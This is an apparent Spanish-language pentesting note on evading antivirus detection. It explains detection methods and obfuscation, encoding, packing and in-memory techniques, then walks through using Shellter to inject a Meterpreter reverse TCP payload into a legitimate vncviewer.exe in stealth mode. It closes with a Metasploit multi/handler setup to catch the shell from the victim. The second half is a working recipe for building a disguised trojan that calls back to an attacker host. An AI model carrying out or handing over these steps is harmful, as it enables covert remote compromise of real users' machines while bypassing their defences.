# Evasión con Shellter en un AV

Tags: #Shellter #AV 

La evasión de defensa consiste de técnicas que los adversarios usan para evitar la detección a través del compromiso. La técnica usada para la evasión de la defensa incluye instalar/desestabilizar el software de seguridad o ocultar/cifrar data y scripts. Los adversarios también, aprovechan y abusan de procesos para esconder o enmascarar sus malware.

El software antivirus normalmente utiliza detección basada en firmas, heuristica y comportamiento. 
1. Detección basada en firmas:  Una firma AV es una secuencia única de bytes que de manera única identifica malware. Como resultado, tendrá que asegurarse de que su exploit ofuscado o carga útil no coincide con ninguna firma conocida en la base de datos ANTIVIRUS. Podemos eludir la detccion basada en formas modificando la secuencia de bytes del malware, por lo tanto, cambiando la firma.
2. Detección basada en heuristica:  Se basa en reglas o decisiones para determinar si un binario es malicioso. También busca patrones específicos dentro del código o llamadas al programa. 
3. Detección basada en el comportamiento: Se basa en la identificación de malware mediante el monitoreo de su comportamiento. (Usado para nuevas cepas de malware)

Técnicas de evasión en disco:
1. Ofuscación: Se refiere al proceso de ocultar temporalmente algo importante, valioso o critico. La ofuscación reorganiza el código para que sea mas difícil de analizar o  RE (Ingeniería reversa).
2. Codificación: Codificar datos es un proceso que implica cambiar los datos a un nuevo formato utilizando un esquema. La codificación es un proceso reversible; los datos pueden codificar a un nuevo formato y decodificando a su formato original. 
3. Empaquetamiento: Generar un ejecutable con una nueva estructura binaria con un tamaño mas pequeño y por lo tanto, proporciona el payload con una nueva firma. 
4. Cifradores: Cifra el código o payloads y descifra el código cifrado en la memoria. La clave/función del descifrado generalmente se almacena en un stub. 

Técnicas de evasión en memoria:
1. Se enfoca en manipular la memoria y hace archivos no escribibles al disco.
2. Inyecta payload dentro de un proceso aprovechando varias APIs de Windows. 
3. El payload es también ejecutado en memoria en una amenaza separada. 

```bash 
❯ https://www.shellterproject.com/introducing-shellter/
```

## Shellter

```bash 
# Shellter ayuda a inyectar una ReverShell en un archivo legitimo ejecutables en Windows.

❯ apt install shellter                             # Instalamos Shellter, Shellter solo soporta 32 bit Payload
❯ apt install wine32
❯ dpkg --add-architecture i386 
```

```bash 
❯ cd /usr/share/windows-resources/shellter/        # Path donde se ecuentra Shellter

❯ wine shellter.exe                                # Ejecutamos Shellter
	❯ A                                           # Modo automatico 
	❯ /home/Desktop/AVBypass/vncviewer.exe        # Utilizaremos el 'vncviewer.exe' para inyectarle codigo malicioso
	❯ y                                           # Para que al momento de que se ejecute el .exe funcione con normalidad (Stealth mode)
	❯ L                                           # Listed payload or custom
	❯ 1                                           # Escogemos la opcion 1 (Meterpreter_Reverse_tcp)
	❯ <IP>                                        # Set LHOST del atacate
	❯ 443                                         # Set LPORT del atacante

# Solo debemos de pasar el nuevo archivo .exe a la maquina victima y ejecutarlo para obtener la Revershell. 
```

## Revershell Metasploit

```bash 
# Configuracion para recibir la conexion de la revershell

❯ use multi/handler 
	❯ set payload windows/meterpreter/reverse_tcp
	❯ set LHOST <IP>
	❯ set LPORT 443 
```